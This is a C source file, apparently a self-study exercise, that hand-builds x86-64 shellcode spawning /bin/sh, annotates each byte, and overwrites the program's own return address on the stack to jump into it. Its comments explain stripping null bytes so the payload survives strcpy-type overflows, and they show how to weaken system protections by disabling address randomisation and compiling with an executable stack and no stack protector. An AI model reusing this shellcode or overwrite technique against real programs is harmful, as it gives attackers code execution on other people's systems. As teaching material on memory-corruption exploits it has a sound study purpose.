// gcc -g -Wall -Wextra -static -z execstack -fno-stack-protector -std=c99  -o t  spawnshell_test.c
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// #define SPAWN_SHELL_FROM_BUFFER
// #define USE_KNOWN_RETURN_ADDRESS
#define KNOWN_RETURN_ADDRESS_VAL 0x401120
// #define KNOWN_RETURN_ADDRESS_VAL 0x401136
#define MAX_STACK_ADDRESS_JUMPS        12
#define USE_CUSTOM_SHELLCODE_STR

// on x86-64, rbp and rsp are used instead of ebp and esp
#if (defined(__x86_64__))
size_t get_stack_base_ptr() { __asm__("mov %rbp, %rax"); }
size_t get_stack_top_ptr() { __asm__("mov %rsp, %rax"); }
#else
size_t get_stack_base_ptr() { __asm__("mov %ebp, %eax"); }
size_t get_stack_top_ptr() { __asm__("mov %esp, %eax"); }
#endif



const char shcode[] =
#ifndef USE_CUSTOM_SHELLCODE_STR
	// zbt's 30-byte x86-64 shellcode from 2010-04-26
	//
	//
	// "\x55"                                   // push   %rbp                    ( 1 byte ) ADDED
	// "\x48\x89\xe5"                           // mov    %rsp, %rbp              ( 3 bytes) ADDED
	// "\x48\x83\xec\x10"                       // sub    $0x10, %rsp             ( 4 bytes) ADDED

	"\x48\x31\xd2"                              // xor    %rdx, %rdx              ( 3 bytes) char** envp = NULL

	"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // mov $0x68732f6e69622f2f, %rbx  (10 bytes) rbx = "//bin/sh" [mov qword rbx, '//bin/sh']
	"\x48\xc1\xeb\x08"                          // shr    $0x8, %rbx              ( 4 bytes) strip first '/', creates 0-byte at EOS
	"\x53"                                      // push   %rbx                    ( 1 byte ) first argument to execve
	"\x48\x89\xe7"                              // mov    %rsp, %rdi              ( 3 bytes) rdi = &rbx (char*)

	// ""                                       // push   %rax                    ( 0 bytes) missing? or unnecessary?
	"\x57"                                      // push   %rdi                    ( 1 byte ) second argument to execve
	"\x48\x89\xe6"                              // mov    %rsp, %rsi              ( 3 bytes) rsi = &rdi (char**)

	"\xb0\x3b"                                  // mov    $0x3b, %al              ( 2 bytes) execve syscall-code (59)
	"\x0f\x05";                                 // syscall                        ( 2 bytes) FIXME: segfaults, use strace
	// "\xc3";                                  // retq                           ( 1 byte ) ADDED
#else
	// own version from disassembling a simple spawner
	//
	// note: only works on x86-64, need to rename all
	// registers and push execve arguments onto stack
	// in 32-bit mode and treat string literal as quad
	// word
	//
	//   char* name[2] = {"/bin/sh", NULL};
	//   execve(name[0], &name[0], NULL);
	//
	// instructions commented out are of two types:
	//   1) redundant if executing directly inside main()
	//   2) contain embedded 0's and need to be rewritten
	//
	//
	// "\x55"                                   // push   %rbp
	// "\x48\x89\xe5"                           // mov    %rsp,%rbp
	"\x48\x83\xec\x10"                          // sub    $0x10,%rsp

	//   0x68 73 2f 6e 69 62 2f 2f  -->
	//    "68 73 2f 6e 69 62 2f 2f" -->
	//    " h  s  /  n  i  b  /  /" (LE)
	//
	// string needs to be null-terminated but this would
	// introduce a zero-byte making the exploit useless
	// for strcpy-type overflows --> add an extra slash
	// and >> it away, introduces the 0 for free
	//
	"\x48\xba\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // movabs $0x68732f6e69622f2f,%rdx
	"\x48\xc1\xea\x08"                          // shr    $0x8,%rdx

	// the number in rdx represents a string literal
	// but the execve syscall expects a char pointer
	// --> push it onto the stack, then use the moved
	// stack pointer as an address
	"\x52"                                      // push   %rdx
	"\x48\x89\x65\xf0"                          // mov    %rsp,-0x10(%rbp)     name[0] = "/bin/sh"

	"\x48\x31\xd2"                              // xor    %rdx,%rdx
	"\x48\x89\x55\xf8"                          // mov    %rdx,-0x8(%rbp)      name[1] = NULL
	// "\x48\xc7\x45\xf8\x00\x00\x00\x00"       // movq   $0x0,-0x8(%rbp)      name[1] = NULL

	"\x48\x8b\x7d\xf0"                          // mov    -0x10(%rbp),%rdi     rdi =  name[0] (arg #1)
	"\x48\x8d\x75\xf0"                          // lea    -0x10(%rbp),%rsi     rsi = &name[0] (arg #2)
	// "\x48\xc7\xc2\x00\x00\x00\x00"           // mov    $0x0,%rdx            rdx = NULL (arg #3)
	// "\x48\x31\xd2"                           // xor    %rdx,%rdx            rdx = NULL (arg #3)

	// "\x48\xc7\xc0\x3b\x00\x00\x00"           // mov    $0x3b,%rax
	"\x48\x31\xc0"                              // xor    %rax,%rax
	"\x48\x83\xc0\x3b"                          // add    $0x3b,%rax
	"\x0f\x05";                                 // syscall                     execve("/bin/sh", ["/bin/sh"], NULL)
#endif

// can't use local buffer because stack address
// (&buffer[0]) will be invalid after we return
static char buffer[sizeof(shcode)] = {0};



int main();
void exploit() {
	char* stack = NULL;

	// start one stack address higher up so that
	// we do not overwrite our own local variable
	// (this lies between %rbp and %rsp)
	//
	// these work with both approaches
	// stack = (char*) get_stack_base_ptr();
	stack = (char*) (&stack);

	// <stack> should always be aligned
	assert((((size_t) stack) % 8) == 0);
	memcpy(buffer, shcode, sizeof(shcode));

	// note: needs "-z execstack" for the "overwrite
	// return-address to point to location on stack"
	// version
	//
	// also needs "kernel.randomize_va_space = 0" in
	// /etc/sysctl.conf on modern systems (sysctl -p)
	// ("echo 0 > /proc/sys/kernel/randomize_va_space")
	// such that the return-address in the target'ed
	// binary can be inferred from crashing it (with
	// a large overflow)
	//
	#ifdef USE_KNOWN_RETURN_ADDRESS
	{
		// safe way, but requires knowing the return-address
		// (easy to find: disassemble and choose code address
		// of the first instr. after the call to <exploit>)
		//
		while (*((size_t*) stack) != KNOWN_RETURN_ADDRESS_VAL) {
			stack += sizeof(void*);
		}

		// override ret-address in main() to point to &buffer[0]
		// stepi in gdb will show each instruction as $ip$ walks
		// through the buffer
		*((size_t*) stack) = (size_t) &buffer[0];
	}
	#else
	{
		// unsafe way, just overwrite <N> stack addresses
		// this can easily corrupt too much of the stack,
		// keep addresses within a sane range for safety
		//
		for (unsigned int n = 0; n < MAX_STACK_ADDRESS_JUMPS; n++) {
			if ((*((size_t*) stack) > (size_t) &main) && (*((size_t*) stack) < (size_t) &buffer[0])) {
				*((size_t*) stack) = (size_t) &buffer[0];
				break;
			}

			stack += sizeof(void*);
		}
	}
	#endif
}



int main() {
	#ifndef SPAWN_SHELL_FROM_BUFFER
	{
		// actually do some work to overwrite retaddr
		exploit();
	}
	#else
	{
		// spawn a shell directly from the code (easy)
		// in asm this becomes the unusual "callq *%rdx"
		(*(void (*)()) &shcode[0])();
	}
	#endif

    return 0;
}

